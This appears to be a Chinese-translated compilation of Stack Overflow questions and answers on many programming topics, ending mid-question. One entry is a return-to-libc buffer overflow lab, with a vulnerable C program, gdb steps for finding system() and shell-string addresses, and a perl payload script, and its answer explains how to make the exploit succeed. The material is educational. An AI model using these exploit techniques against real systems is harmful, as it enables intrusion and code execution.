> 在 2.3 之前的版本中。？yum 这个错误信息常常具有误导性。要查看真正的错误，请从命令行运行 python，然后键入 import yum。问题可能根本不在于您的 python 版本，而在于缺少 libxml2-python、python-sqlite 或 python-elementtree 包。
> 
> Yum 2.4.x 提供了与模块导入错误不同的错误，因此这将变得不那么混乱。
> 
> 它还包括一个将错误发送到邮件列表的指令。确实，您应该弄清楚哪些 rpm 提供了丢失的模块并尝试安装它。
> 
> 如果您收到 yum 本身是缺失模块的消息，那么您可能安装了它不正确（或使用 make/make install 安装了源 rpm）。如果可能的话，找一个预建的 rpm 可以为你的系统工作，比如 Fedora 或 CentOS 的。或者，您可以下载 srpm 并执行
> 
> rpmbuild --rebuild yum*.src.rpm

所以，如果 else 失败了，你可以在这样的地方得到 yum[包](http://rpmfind.net/linux/rpm2html/search.php?query=yum)。

# vb.net - 欧洲文化代码

> ID：13572643
> 
> 赞同：0
> 
> 时间：2012-11-26T20:29:07.100
> 
> 标签：vb.net

我有一个关于在 Visual Basic 中使用文化代码的简短问题。我所拥有的是一个下拉菜单，人们可以在其中选择他们在本国使用的货币。一切都很好，直到我必须决定如何处理欧元哈哈！我的想法只是使用他们计算机中的当前文化，假设他们使用欧元。我的问题：如果我在应用程序中为任何使用欧元的欧盟国家（例如：荷兰）使用文化代码（出于货币外观目的），这是否可以作为通用代码覆盖任何使用欧元的国家？我必须参考一个 wiki 页面来告诉我哪些国家没有使用欧元，所以我包括了他们的特定货币。当程序再次启动时，代码还会保存所需的文化设置，而不是计算机上的默认设置。该代码确实有效。我'

```
 If ComboBox1.SelectedItem = "EURO (€)" Then
        Me.CurrencyDataSet.CURR(0).CURRTYPE = "EUR"
        Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture("nl-NL")
        Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture("nl-NL")
    End If
    If ComboBox1.SelectedItem = "FRANC (Fr)" Then
        Me.CurrencyDataSet.CURR(0).CURRTYPE = "FR"
        Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture("fr-FR")
        Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture("fr-FR")
    End If
    If ComboBox1.SelectedItem = "POUND (£)" Then
        Me.CurrencyDataSet.CURR(0).CURRTYPE = "GBP"
        Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture("en-GB")
        Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture("en-GB")
    End If
    If ComboBox1.SelectedItem = "ZLOTY (zl)" Then
        Me.CurrencyDataSet.CURR(0).CURRTYPE = "ZL"
        Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture("pl-PL")
        Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture("pl-PL")
    End If 
```

感谢您的关注。

# laravel - 如何通过 Laravel 中的标准数组构建流畅的查询

> ID：13572644
> 
> 赞同：0
> 
> 时间：2012-11-26T20:29:07.137
> 
> 标签：laravel

如果我在数据库标准中存储我想用来构建和过滤查询的内容 - 如何使用 Laravel Fluent Query Builder 构建查询？也许您可以就重构此数组以添加 OR/AND 以在此类条件下进行复杂过滤提供建议？谢谢！

例如，如果我从数据库中读取这些标准并制作数组：

```
$array = array(
    '0' => array(
        'table' => 'users',
        'column' => 'name',
        'criteria' => 'LIKE'
        'value' => 'John'
    ),
    '1' => array(
        'table' => 'groups',
        'column' => 'name',
        'criteria' => 'NOT LIKE'
        'value' => 'Administrator'
    ),
    ...
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T20:44:20.200

如果您真的打算按照自己的方式进行操作，请使用 switch 语句来设置数组索引的标志

```
switch ($query)
 {
 case 0:
   $this->get_data($x);
   break;
 case 1:
   $this->get_data($x);
   break;
 case 2:
   $this->get_data($x);
   break;
 default:
   Return FALSE;
 }
public function get_data($x){
$value = DB::table($array[$x]['table'])
->where($array[$x]['name'], $array[$x]['criteria'], $array[$x]['value'])
->get();

Return $value;
} 
```

但是，我根本不建议这样做。与其将查询过滤器存储在数组中，我认为您应该在模型中将它们设为方法。这将有助于提高可读性、模块化和可重用代码。

```
public function get_user_by_name($name){
 $user = DB::table('users')->where('name', 'LIKE', '%'.$name.'%')->get();
 return $user;
}

public function get_group_by_name($name, $criteria = 'LIKE'){
 $groups = DB::table('groups')->where('name', $criteria, '%'.$name.'%')->get();
 return $groups;
} 
```

[http://laravel.com/docs/database/fluent](http://laravel.com/docs/database/fluent)

# javascript - 内部 forEach 循环中的 ajax，在内部回调触发后完成

> ID：13572645
> 
> 赞同：3
> 
> 时间：2012-11-26T20:29:09.440
> 
> 标签：javascript, ajax, node.js

我有一个在另一个函数内的 forEach 循环内的 ajax 调用。问题是，外部函数的回调在内部循环结束之前触发 - 因此“staticItemList”在传递给回调时没有填充项目。我该如何解决？我真的在这上面花了很多时间。谢谢。

```
 exports.buildTheList = function (parsedList, callback) {
        var staticItemList = {};
        parsedList.forEach(function(parsedItem) { 

                db.staticList.find({"_id":parsedItem.ID}).forEach(function(err, doc) {
                    if (!doc){
                        console.log("newStaticItem not found in db");
                        parsedDataFetcher.fetchParsedDetails(Path, function(parsedDetails){
                            staticItemList["_id"] = parsedItem.ID;
                            staticItemList[parsedItem.ID] = {
                                    "_id": parsedItem.ID,
                                    "type": parsedItem.type,
                                     } 
                                 })

                             }else {
                                   console.log("newStaticItem already found in db");
                             } 
                 });
             });

         callback(staticItemList);
     } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:31:04.510

在循环内添加一个计数器变量，并在每次异步方法完成时递减它。一旦计数器达到零，调用回调。在伪代码中：

```
 var counter = 0;
 foreach(function() {
     counter++;
     doAsync(function() {
           // add to list

           counter--;
           if (counter === 0) {
               callback(list);
           }
     });
 } 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:36:54.093

我会看类似 dojo promise 的东西[`all`](http://dojotoolkit.org/reference-guide/1.8/dojo/promise/all.html#dojo-promise-all)。从手册：

> `dojo/promise/all`是一个函数，它接受多个 Promise 并返回一个新的 Promise，当所有 Promise 都已实现时，该 Promise 已实现。

该页面上的示例演示了如何执行所需的操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:34:32.543

AJAX 异步发生，因此您的循环运行，触发所有 AJAX 调用，然后完成，调用您的回调。您可能需要在 foreach 循环中实现某种计数器，并在每个 AJAX 调用完成时检查它。一个完成的 AJAX 调用的数量与计数器的数量相同，您将从异步函数上下文中执行回调函数。

# javascript - 谷歌地图与 jquery；在 jsfiddle 中工作，停止在服务器上工作

> ID：13572650
> 
> 赞同：0
> 
> 时间：2012-11-26T20:29:37.613
> 
> 标签：javascript, jquery, google-maps, google-maps-api-3

我正在尝试插入一个按钮，单击该按钮会显示一个 Google 表单（与我的融合表相关联）。该按钮位于右上角。

在我的 jsfiddle 上，按钮按预期工作，并且弹出了包含 Google Forms iframe 的 div。

但是当我将所有代码移动到服务器时，按钮停止工作。

[这是 jsfiddle](http://jsfiddle.net/witold/uLcPk/7/)。

这是[服务器上的相同代码](http://pollster.net/app16.html)。它现在产生了意想不到的结果。

```
$(document).ready(function() {

$('.button2').click(function() {

    type = $(this).attr('data-type');

    $('.overlay-container').fadeIn(function() {

        window.setTimeout(function(){
            $('.window-container.'+type).addClass('window-container-visible');
        }, 100);

    });
});

$('.close').click(function() {
    $('.overlay-container').fadeOut().end().find('.window-container').removeClass('window-container-visible');
}); 
```

});​</p>

任何人都可以就这里可能发生的事情以及我应该如何解决这个问题提供一些指导吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:39:11.590

在你最后一个分号之后你有一个零宽度空间（0xE2 0x80 0x8B），它没有宽度，所以你看不到它。jsFiddle 倾向于在您的代码中添加不可见的 Unicode 字符。删除它，你会没事的。

# node.js - 如何从 socket.io 中访问 req.session 变量？

> ID：13572652
> 
> 赞同：3
> 
> 时间：2012-11-26T20:29:52.507
> 
> 标签：node.js, express, socket.io, session-cookies

我正在使用 express 和 socket.io。我有一些`req.session`希望从 socket.io 中访问的变量。[我在socket.io 和 session](https://stackoverflow.com/questions/4641053/socket-io-and-session)上阅读了这篇文章，但我仍然对如何获取`req.session`变量感到非常困惑。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-27T10:14:59.513

实现此目的的一种方法是从套接字内部使用会话存储 - 这将包含您所有的会话变量。这就是我进行授权的方式（将 cookie ID 与数据库中的会话 ID 进行比较）。

```
io.set('authorization', function (data, accept) {

    if (data.headers.cookie) {

        data.cookie = utils.parseCookie(data.headers.cookie);
        data.sessionID = data.cookie['connect.sid'].split('.')[0].substring(2);

        sessionStore.get(data.sessionID, function (err, session) {
                // now you have all session variables
        });                     
    }
}); 
```

# python - 如何从频道名称或 url 中检索频道 ID

> ID：13572657
> 
> 赞同：2
> 
> 时间：2012-11-26T20:30:41.110
> 
> 标签：python, youtube-api

我正在尝试使用新的 v3 API 检索 YouTube 频道的频道 ID。我正在使用 Python 客户端，似乎没有直接的方法可以找到 YouTube 频道 URL 或名称到其频道 ID 的映射。

使用 Python API 客户端，我似乎必须为频道名称发出“频道”类型的搜索查询，然后遍历每个搜索结果，直到找到匹配项。

我将以[http://youtube.com/atgoogletalks](http://youtube.com/atgoogletalks)频道为例

```
search_channel_name = 'atgoogletalks'     #Parsed from http://youtube.com/atgoogletalks
search_response = youtube.search().list(
    type='channel',
    part='id,snippet',
    q=search_channel_name,
    maxResults=50
    ).execute()
for sri in search_response["items"]:
    channels_response = youtube.channels().list(
        id=sri["id"]["channelId"],
        part="id, snippet, statistics, contentDetails, topicDetails"
        ).execute()

    for cr in channels_response["items"]:
        channelname = cr["snippet"]["title"]
        if channelname.lower() == search_channel_name:
            return 'Success' 
```

我已经爬取了文档，寻找一种更直接的方法来做到这一点，但最终还是失败了。有没有更简单的方法？如果没有，是否有计划将此功能添加到 API？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-07-07T19:08:15.303

按照[YouTube 数据 API](https://developers.google.com/youtube/v3/docs/channels/list?hl=en-US) ，您可以使用youtube.channels.list() 的**forUsername参数**

使用您自己的示例：

```
search_channel_name = 'atgoogletalks'
channels_response = youtube.channels().list(
        forUsername=search_channel_name,
        part="id, snippet, statistics, contentDetails, topicDetails"
).execute() 
```

# ruby - 跟踪我在 Ruby 中的编码进度的工具

> ID：13572660
> 
> 赞同：2
> 
> 时间：2012-11-26T20:30:55.273
> 
> 标签：ruby, issue-tracking

简而言之，我正在寻找工具来跟踪我在 Ruby 中“充实”一个复杂系统的进度。

通常，当我开始使用 Ruby 开发一个新系统时，我首先会编写一个`outline.rb`文件，其中包含`stub`我认为我想使用的所有类的类定义。然后我逐渐实现了这个功能。

是否有任何工具可以快速调查我`stubs`并跟踪哪些仍需要实施，以及每次实施花了我多长时间，以小时为单位？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:49:56.837

我通常通过测试来跟踪我的进度。例如，如果你在做 TDD/BDD，你可以使用 rspec 并创建标记为“待定”的测试——基本上没有正文的测试。

以这个要点为例（https://gist.github.com/4150506）

```
describe "My API" do

  it "should return a list of cities (e.g. New York, Berlin)"
  it "should return a list of course categories"
  it "should return a list of courses based on a given city"
  it "should return a list of courses based on a category and city"

end 
```

在其中，我列出了一些测试，一旦所有实现细节到位，我希望系统通过这些测试。这使我可以全面了解我正在构建的内容，而不会太快太深。

更新：这个想法是能够在命令行运行规范，rspec 会告诉你哪些测试通过、失败或待定。

至于时间跟踪部分，我只使用了一个计时器应用程序（例如tickspot.com）。您也可以随时记下规范文件上的时间戳，以了解何时开始修改文件以及何时停止。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:59:26.567

我的回答基本上是“不”。

你如何定义“完成”？不是“只是一个存根”，还是表现出完整的行为？您如何定义“完整”行为？你最初没有存根的方法呢，我只能想象会有几十个，如果不是几百个的话。

对存根方法的时间并没有让我觉得这是一个有意义的统计数据，而是对功能的时间。这应该通过问题跟踪票据和提交日志来处理，但这将反映整体时间，而不是具体的任务时间，这通常是显着不同的。

如果没有非常精细的问题跟踪、时间输入以及单元和行为测试，我看不出如何在任何重大规模的项目中以任何真正的准确性完成这项工作。即使这样，您也可能需要构建一些工具来帮助您使用特定的方法。

# java - Drools Guvnor：日期和时间是如何工作的？

> ID：13572661
> 
> 赞同：2
> 
> 时间：2012-11-26T20:30:58.080
> 
> 标签：java, jboss, rules, guvnor

我知道Java，我知道C#。

我是 JBoss Drools “Guvnor” 的菜鸟，一般来说只是他们的 DRL 规则语言。我需要一些关于如何在 LHS 规则中正确使用日期和时间的帮助。

例如，我必须确保医疗保健系统中的数据质量。显然，每个患者的记录中都有一个 DOB，它的类型是 java.util.Date。

好的，假设我想确保作为 Facts 传递的数据中的 DOB 确实在今天之前。我知道，例如，在 C# 中，您可以通过说 DateTime.Now 来获取当前日期/时间。

我想在 Guvnor 中添加一条规则（这是伪代码）：

WHEN 患者 DOB 早于 NOW THEN 将患者标记为有效

我的病人事实是：

声明患者患者 ID：整数 firstName：文本 lastName：文本 dateOfBirth：java.util.Date end

我还有一个 Dose 事实，带有一个 patientID 字段，可以将它与什么患者得到什么剂量相关联：

声明剂量doseID：整数患者ID：整数管理日期：java.util.Date量：整数结束

另外，假设在 1995 年的某一年发布了一种药物，我还想检查给定患者的剂量是否在该年之前没有给药。

我该怎么做这两个？我已经尝试过谷歌搜索和谷歌搜索，但我得到的只是指向（完全没用的）Guvnor 用户指南的链接，该指南写得非常糟糕，因为它不包含这些基本信息，即日期和时间如何工作和编写在 DRL 语法中。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T08:34:36.893

与往常一样，有不止一种方法可以做到这一点。这是一个。

```
function Date currentTime(){
  // The content of this method is Java
  return new Date();
}

RULE "my rule"
  WHEN 
    patient : Patient( dateOfBirth < currentTime() )
  THEN 
    // Everything in THEN part is Java
    patient.setValid(true);  // Notice I added a valid field into the fact type
    update(patient); 
END 
```

您要求的另一条规则

> 另外，假设在 1995 年某年发布了一种药物，我还想检查给定患者的剂量是否在该年之前没有给药。

```
RULE "Second Rule"
  WHEN
    patient : Patient() 
    not Dose( patientId == patient.patientId, administeredDate < 01-Jan-1995 ) // The date format can be changed if you want to.
  WHEN
    System.out.println( "Patient " + patient.getFirstName + " " +patient.getLastName() + " was not given a dose before." );
END 
```

Guvnor 用户指南不包括语言基础知识。您可以从[这里](http://docs.jboss.org/drools/release/5.5.0.Final/drools-expert-docs/html_single/index.html)找到它们。Guvnor 旨在为您提供指导编辑器来编写 DRL 或存储包含 DRL 的文件。您可以通过按下每个生成 DRL 的资产编辑器中的“查看源代码”按钮来检查引导规则是否是用 DRL 编写的。

# c - 带有指向数组的指针的 C 结构

> ID：13572664
> 
> 赞同：3
> 
> 时间：2012-11-26T20:31:19.747
> 
> 标签：c, pointers

我有以下代码，我对为什么会出现分段错误感到有些困惑。

```
typedef struct {
  int tag;
  int valid;
} Row;

typedef struct {
  int index;
  int num_rows;
  Row **rows;
} Set;

/* STRUCT CONSTRUCTORS */

// Returns a pointer to a new Sow.
// all fields of this row are NULL
Row* new_row() {
  Row* r = malloc(sizeof(Row));
  return r;
}

// Returns a pointer to a new Set.
// the set's index is the given index, and it has an array of
// rows of the given length.
Set* new_set( int index, int num_rows, int block_size ) {
  Set* s = malloc(sizeof(Set));
  s->index = index;
  s->num_rows = num_rows;

  Row* rows[num_rows];
  for (int i = 0; i < num_rows; i++) {
    Row* row_p = new_row();
    rows[i] = row_p;
  }
  s->rows = rows;

  return s;
}

/* PRINTING */

void print_row( Row* row ) {
  printf("<<T: %d, V: %d>>", row->tag, row->valid);
}

void print_set( Set* set ) {
  printf("[ INDEX %d :", set->index);

  for (int i = 0; i < set->num_rows; i++) {
    Row* row_p = set->rows[i];
    print_row(row_p);
  }

  printf(" ]\n");
}

int main(int argc, char const *argv[]) {

  Set* s = new_set(1, 4, 8);
  print_set(s);

  return 0;

} 
```

基本上 a`Set`有一个指向`Row`s 数组的指针。我认为`Row* row_p = set->rows[i];`这是从一组中获取行的正确方法，但我一定遗漏了一些东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:34:19.207

`Row*`您正在分配s的本地数组

```
 Row* rows[num_rows];
  for (int i = 0; i < num_rows; i++) {
    Row* row_p = new_row();
    rows[i] = row_p;
  }
  s->rows = rows; 
```

并让`rows`指针`Set`指向那个。函数返回后，本地数组不再存在，因此`s->rows`是一个悬空指针。在函数返回后仍然有效的内存必须分配给`malloc`（或其表亲之一）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:34:10.000

`s->rows``rows`在函数中分配了局部变量的地址`new_set()`，这意味着返回时`s->rows`是一个[悬空指针](http://en.wikipedia.org/wiki/Dangling_pointer)`new_set()`。动态分配一个数组`Row*`来纠正：

```
s->rows = malloc(num_rows * sizeof(Row*));
if (s->rows)
{
    /* for loop as is. */
} 
```

请记住，`s->rows`及其元素必须是`free()`d。

# android - Android ListView：检测 ListView 数据是否适合屏幕而不滚动

> ID：13572667
> 
> 赞同：12
> 
> 时间：2012-11-26T20:31:37.633
> 
> 标签：android, listview

> **可能重复：**
> [Android：使用 notifyDataSetChanged 和 getLastVisiblePosition - listView 何时实际更新？](https://stackoverflow.com/questions/6044796/android-using-notifydatasetchanged-and-getlastvisibleposition-when-the-listvi)

我有一个简单的 ListView，只有几个条目。根据设备大小和方向，ListView 是否需要滚动。

我在屏幕上还有一张图片，这不是必需的。如果 ListView 没有足够的空间而不滚动，我想删除图片。

当我在活动的 onCreate 中填充我的 ListView 时，getLastVisiblePosition() 还无效，它返回-1。因此，我无法将最后一个可见项目与列表计数进行比较。

int lastVisiblePos = listView.getLastVisiblePosition(); // 返回 -1

（如果我稍后单击按钮重新检查，则该值是正确的。）

使用 onScrollingListener 为时已晚，因为首先不应该显示图片。

我正在 API 级别 10 上开发。

有什么建议么？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-26T21:07:25.260

[`getLastVisiblePosition()`](http://developer.android.com/reference/android/widget/AdapterView.html#getLastVisiblePosition%28%29)与Runnable 中的比较，[`getCount()`](http://developer.android.com/reference/android/widget/AdapterView.html#getCount%28%29)以查看整个 ListView 在绘制后是否适合屏幕。您还应该检查最后一个可见行是否完全适合屏幕。

创建可运行文件：

```
ListView listView;
Runnable fitsOnScreen = new Runnable() {
    @Override
    public void run() {
        int last = listView.getLastVisiblePosition();
        if(last == listView.getCount() - 1 && listView.getChildAt(last).getBottom() <= listView.getHeight()) {
            // It fits!
        }
        else {
            // It doesn't fit...
        }
    }
}; 
```

在`onCreate()`ListView 的处理程序中排队您的 Runnable：

```
listView.post(fitsOnScreen); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:02:58.030

你为什么要找问题？代替您的想法，您可以使用 3 种布局：

1.  必要时的小部件 - 标题
2.  ListView - 主要布局
3.  ImageView 或其他小部件 - 页脚

```
ListView lv = (ListView) findViewById(R.id.listView);
View header = getLayoutInflater().inflate(R.layout.header_layout, null);
View footer = getLayoutInflater().inflate(R.layout.foorer_layout, null);
lv.addHeaderView(headerComment);
lv.addFooterView(footerComment); 
```

# java - 用于社交 api 身份验证的故障排除 scribe

> ID：13572668
> 
> 赞同：1
> 
> 时间：2012-11-26T20:31:40.993
> 
> 标签：java, scribe

我刚开始查看 scribe 以使用 twitter/facebook 等社交网络进行身份验证。我使用 twitter 的示例作为参考。但是，由于某种原因，我似乎没有从 twitter 获取 oauth_verifier（即使回调是通过服务构建器注册的——我在回调中使用 localhost，因为它与另一个社交 api 一起使用）。任何有用的建议都将受到欢迎。提前致谢。

```
OAuthService service = new ServiceBuilder()
.provider(TwitterApi.class)
.apiKey(consumerKey)
.apiSecret(consumerSecret)
.callback("http://localhost/oauth/twitter")
.build();

        //get the token
        Token requestToken = service.getRequestToken();

        String authUrl = service.getAuthorizationUrl(requestToken);
        Logger.info("authurl::" + authUrl); // not getting the oauth_verifier 
```

**来自 scribe 的调试输出**（*我更改了令牌信息*）：

```
setting oauth_callback to http://localhost/oauth/twitter
generating signature...
base string is: POST&http%3A%2F%2Fapi.twitter.com%2Foauth%2Frequest_token&oauth_callback%3Dhttp%253A%252F%252Flocalhost%252Foauth%252Ftwitter%26oauth_consumer_key%3DAAACCCV6ASDFGHJCgYBCD%26oauth_nonce%3D607134093%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D1353965859%26oauth_version%3D1.0
signature is: +mSqKJIC1Q0pMEFs/gIJViF7kbg=
appended additional OAuth parameters: { oauth_callback -> http://localhost/oauth/twitter , oauth_signature -> +mSqKJIC1Q0pMEFs/gIJViF7kbg= , oauth_version -> 1.0 , oauth_nonce -> 607134093 , oauth_signature_method -> HMAC-SHA1 , oauth_consumer_key -> AAACCCV6ASDFGHJCgYBCD , oauth_timestamp -> 1353965859 }
using Http Header signature
sending request...
response status code: 200
response body: oauth_token=itJrpOP3KLeD7Ha6oy0IRr4HysFut5eAOpIlj8OmNE&oauth_token_secret=X8LmhAUpvIkfEd7t7P1lvwwobC3JJIhUabcEs0Rn5w&oauth_callback_confirmed=true
authurl::https://api.twitter.com/oauth/authorize?oauth_token=itJrpOP3KLeD7Ha6oy0IRr4HysFut5eAOpIlj8OmNE
obtaining access token from http://api.twitter.com/oauth/access_token
setting token to: Token[itJrpOP3KLeD7Ha6oy0IRr4HysFut5eAOpIlj8OmNE , X8LmhAUpvIkfEd7t7P1lvwwobC3JJIhUabcEs0Rn5w] and verifier to: org.scribe.model.Verifier@55ac8c3d
generating signature... 
```

更新：我现在可以收到 oauth_verifier。完成测试后，我将更新此帖子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T23:42:17.883

主要是飞行员错误。我能够使用 scribe 让 oauth 与 twitter 一起工作。在获得服务、来自服务的请求令牌和来自服务的 authenticationUrl 之后（在传递请求令牌时），我能够重定向到授权 URL。在那里，我能够使用我的 twitter ID 对自己进行身份验证，该 ID 将我重定向到创建服务时指定的回调 URL。身份验证后，我收到了 oauth_verifier，我可以使用它来创建验证器，然后使用验证器和请求令牌从服务接收访问令牌。然后发出并签名了 oauth 请求，这导致了 Twitter 的响应以及用户详细信息。工作。希望能帮助到你。

# salesforce - 将具有多个选择的按钮添加到标准页面（机会）

> ID：13572669
> 
> 赞同：1
> 
> 时间：2012-11-26T20:31:45.423
> 
> 标签：salesforce, apex-code, visualforce

是否可以将自定义按钮添加到包含多个可供选择的选项的标准机会页面？

所以例如...

按钮文本：“添加产品”

1.  下拉选择项 1：“团队 1 产品”
2.  下拉选择项 2：“团队 2 产品”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:39:53.617

*（这将是一个紧密联系的答案。请不要杀死信使，只是我宁愿看到 Salesforce 提供的本机解决方案或重用现有的东西，而不是全新的实施尝试......）*

您可能想对 2 个想法进行投票：

[http://success.salesforce.com/ideaView?id=08730000000HAOK](http://success.salesforce.com/ideaView?id=08730000000HAOK)并入[http://success.salesforce.com/ideaview?id=08730000000BqRhAAK](http://success.salesforce.com/ideaview?id=08730000000BqRhAAK)。后者说这是“正在考虑中”，祈祷！

[来自 technrd.com 的 Jason Venable](http://www.tehnrd.com/about/)创建了一个有趣的 Visualforce 组件，您可以查看：[http ://www.tehnrd.com/custom-multi-select-buttons/](http://www.tehnrd.com/custom-multi-select-buttons/)

如果您可以接受此按钮不是作为标准按钮而是作为嵌入的 visualforce 页面显示 - 太棒了。如果没有 - 你可能仍然检查他的解决方案，看看你能挽救多少。可以将 javascript 注入任何标准页面布局（甚至通常难以自定义的“编辑”布局，不显示嵌入式按钮等）。您可以从侧边栏或使用我在[此处](https://stackoverflow.com/a/13104454/313628)和[此处](https://stackoverflow.com/a/13254329/313628)描述的技巧注入它。

因此，您可以编写一个代码片段来获取“按钮面板”的 id（分别是`<td class="pbButton" id="topButtonRow">`和`<td class="pbButton" id="bottomButtonRow">`，然后使用 Jason 的代码作为基础动态添加一个条目。

# c - 返回 libc - 非法指令

> ID：13572673
> 
> 赞同：6
> 
> 时间：2012-11-26T20:32:08.787
> 
> 标签：c, security, buffer-overflow, exploit

我正在处理缓冲区溢出问题，尤其是返回 libc 类型。

我有以下易受攻击的代码：

```
#include<stdio.h>
#include<string.h>

main( int argc, char **argv)
{
    char buffer[80];
    getchar();
    strcpy(buffer, argv[1]);
    return 1;
} 
```

`-fstack-protector`我使用带有`-mpreferred-stack-boundary=2`标志的gcc-2.95 (no ) 编译它。[我跟着回到了“黑客：剥削的艺术”的](http://www.dmi.unipg.it/~bista/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2b0-exploit-in-not-executable-stack.html)libc 章节。

首先，我禁用了 ASLR：

```
$ cat /proc/sys/kernel/randomize_va_space 
0 
```

我找到了地址`system`：

```
$ cat find_system.c
int main() {
    system("");
    return 0;
}
$ gdb -q find_system
Reading symbols from /home/bob/return_to_libc/find_system...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048416
(gdb) run
Starting program: /home/bob/return_to_libc/find_system 

Breakpoint 1, 0x08048416 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7eb6680 <system> 
```

我创建了一个环境变量来包含我想要执行的命令`system`：

```
$ cat get_env.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%s=%s: %p\n", argv[1], getenv(argv[1]), getenv(argv[1]));
    return 0;
}
$ export EXPLOIT=/bin/zsh
$ ./get_env EXPLOIT
EXPLOIT=/bin/zsh: 0xbffff96d 
```

然后我制作了一个 perl 脚本来自动获取 shell：

```
$ cat script.pl
#!/usr/bin/perl

for ($i = 1; $i < 200; $i++) {
    print "Perl count: $i\n";
    system("echo 1 | ./vuln '" . "A"x$i . "\x80\x66\xeb\xb7FAKE\x6d\xf9\xff\xbf'");

}
$ ./script.pl
(...)
Perl count: 69
Perl count: 70
Perl count: 71
Perl count: 72
Illegal instruction
Perl count: 73
Segmentation fault
Perl count: 74
Segmentation fault
(...) 
```

我哪里做错了？为什么我得到“非法指令”而不是我的外壳？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-27T01:56:44.713

```
$ gdb vuln
(gdb) run 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\x66\xeb\xb7FAKE\x6d\xf9\xff\xbf' 
```

改变“A”的数量以测试各种故障。在 find `python -c "print 'A'*73"`（73 用于产生上述）有助于生成参数。

gdb 会准确地告诉您崩溃的位置以及崩溃时 EIP/RIP 上的内容。这应该会引导您回答您的问题。

最有可能的是，您在堆栈的返回地址中没有得到一个好的指针，并且执行降落在没有反汇编为有效指令的内存中。我想你离这里很近。分段错误更有可能是执行降落在甚至未分配的内存区域中。

用于`(gdb) x/10i $eip`识别崩溃时 EIP 上的指令。您可以通过更改该命令中的 10 来改变显示的反汇编长度。

您还需要弄清楚您对 system 的参数在堆栈上的哪个位置，以便将其置于调用约定中的适当位置以让 system 调用它。gdb 也应该能够在这里为您提供帮助（再次，使用`x`-`x/4w`也许 - 和`i r`）。

成功的利用需要上述两个部分：0xb7eb6680 必须在返回地址中，而 0xbffff96d 必须在系统要从中读取其第一个参数的任何位置。

另一个有用的技巧：在函数`ret`末尾设置断点。`strcpy`这是一个方便的地方，可以检查您的堆栈和注册状态并确定您将要做什么。这`ret`就是利用发生的地方：读取您提供的返回地址，处理器开始在该地址执行并且您关闭，假设您可以使用适当的参数来维持执行，无论您正在调用什么等等。程序的状态`ret`是成或断点，因此它是查看您的输入有什么问题以及为什么会或不会成功利用该漏洞的最简单的地方。

如果我的 gdb 语法没有成功，请原谅我……它不是我的主要调试器。

# python - 如何使用 Beautiful Soup 在一个查询中获取多个类

> ID：13572676
> 
> 赞同：2
> 
> 时间：2012-11-26T20:32:21.217
> 
> 标签：python, html-parsing, beautifulsoup

我想在下面的 html 中找到带有 class="s" 或 class="sb" 的 td

```
<tr bgcolor="#e5e5f3"><td class="sb" width="200" align="left">test1</td><td class="sb" align="right">5,774.0</td><td class="sb" align="right">4,481.0</td><td class="sb" align="right">5,444.0</td><td class="sb" align="right">6,615.0</td><td class="sb" align="right">6,858.0</td></tr>
<tr bgcolor="#f0f0E7"><td class="s" width="200" align="left">test2</td><td class="s" align="right">5,774.0</td><td class="s" align="right">4,481.0</td><td class="s" align="right">5,444.0</td><td class="s" align="right">6,615.0</td><td class="s" align="right">6,858.0</td></tr> 
```

我现在正在使用以下代码。但只能获得等于“S”的类。是否可以在一个 Beautiful Soup find_all 查询中同时获得“s”和“sb”？

```
 soup = BeautifulSoup(urllib2.urlopen(url).read(),"lxml");
 for item in soup.find_all("td", { "class" : "s" }): 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-26T20:39:38.167

您可以使用 beautiful soup 对正则表达式的支持来做到这一点。

```
import re
soup = BeautifulSoup(urllib2.urlopen(url).read(),"lxml");
for item in soup.find_all("td", { "class" : re.compile(r"^(s|sb)$") }) 
```

此正则表达式匹配：

*   `^`- 字符串的开头

*   `(s|sb)`- 字符串`'s'`或字符串`'sb'`

*   `$`- 字符串的结尾

# c# - 在VS2010中查找和替换双引号之间的所有文本

> ID：13572679
> 
> 赞同：5
> 
> 时间：2012-11-26T20:32:45.973
> 
> 标签：c#, regex, visual-studio-2010, visual-studio, replace

在 Visual Studio 2010 中使用快速替换，我如何替换除双引号括起来的所有文本。我不确定是否可以使用 WildCards 或 Regex 来执行此操作。下面是一个例子。

这是原始代码：

```
TypeByName("bPhone3", "9999");
